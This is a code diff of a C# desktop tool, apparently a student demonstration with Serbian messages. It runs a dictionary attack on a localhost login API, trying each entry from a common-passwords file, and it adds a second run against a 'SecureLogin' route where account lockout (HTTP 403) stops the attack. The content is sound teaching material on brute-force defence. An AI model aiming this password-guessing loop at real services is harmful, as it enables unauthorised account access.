@@ -25,12 +25,12 @@ namespace DictionaryAttack
         {
             var user = new User();
             user.Username = textBox1.Text;
-            StreamReader file = new StreamReader("commonusedpasswords.txt");
+            StreamReader file = new StreamReader("../../../commonusedpasswords.txt");
             string password;
             while ((password = file.ReadLine()) != null)
             {
                 user.Password = password;
-                HttpStatusCode response =  await SendRequest(user);
+                HttpStatusCode response =  await SendRequest(user, "DictionaryAttack");
                 if(response == HttpStatusCode.OK) 
                 {
                     MessageBox.Show("Lozinka uspešno pogođena!\n Lozinka je: " + password);
@@ -39,17 +39,41 @@ namespace DictionaryAttack
             }
             MessageBox.Show("Lozinka nije pogođena!");
         }
-        private async Task<HttpStatusCode> SendRequest(User user)
+        private async Task<HttpStatusCode> SendRequest(User user, string route)
         {
             var json = JsonConvert.SerializeObject(user);
             var data = new StringContent(json, Encoding.UTF8, "application/json");
 
-            var url = "http://localhost:56027/login/DictionaryAttack";
+            var url = "http://localhost:9000/Login/" + route;
             var client = new HttpClient();
 
             var response = await client.PostAsync(url, data);
 
             return response.StatusCode;
+        }
+
+        private async void button2_Click(object sender, EventArgs e)
+        {
+            var user = new User();
+            user.Username = textBox1.Text;
+            StreamReader file = new StreamReader("../../../commonusedpasswords.txt");
+            string password;
+            while ((password = file.ReadLine()) != null)
+            {
+                user.Password = password;
+                HttpStatusCode response = await SendRequest(user, "SecureLogin");
+                if (response == HttpStatusCode.OK)
+                {
+                    MessageBox.Show("Lozinka uspešno pogođena!\n Lozinka je: " + password);
+                    return;
+                }
+                else if(response == HttpStatusCode.Forbidden)
+                {
+                    MessageBox.Show("Nalog je trenutno blokiran.");
+                    return;
+                }
+            }
+            MessageBox.Show("Lozinka nije pogođena!");
         }
     }
 }
